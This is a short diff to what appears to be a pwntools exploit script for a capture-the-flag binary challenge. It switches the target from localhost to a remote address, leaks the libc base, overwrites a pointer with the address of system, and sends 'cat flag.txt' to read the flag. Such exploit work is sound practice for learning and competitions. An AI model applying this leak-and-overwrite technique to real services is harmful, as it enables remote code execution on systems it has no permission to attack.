@@ -5,7 +5,7 @@ from time import sleep
 context.arch = "amd64"
 exe = ELF("./main")
 libc = exe.libc
-host, port = "localhost", 12001 
+host, port = "20.224.160.150", 12001 
 if args.REMOTE:
     p = remote(host,port)
 elif args.GDB:
@@ -83,8 +83,8 @@ view()
 p.recvuntil(b"[11] ")
 libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x199340
 log.info(hex(libc.address))
-
-rename(b'11', p64(libc.address + 0x58750)) #system@libc
+rename(b'11', p64(libc.address + 0x58751)) #system@libc
 ret(b'12')
+p.sendline(b"cat flag.txt")
 
 p.interactive()
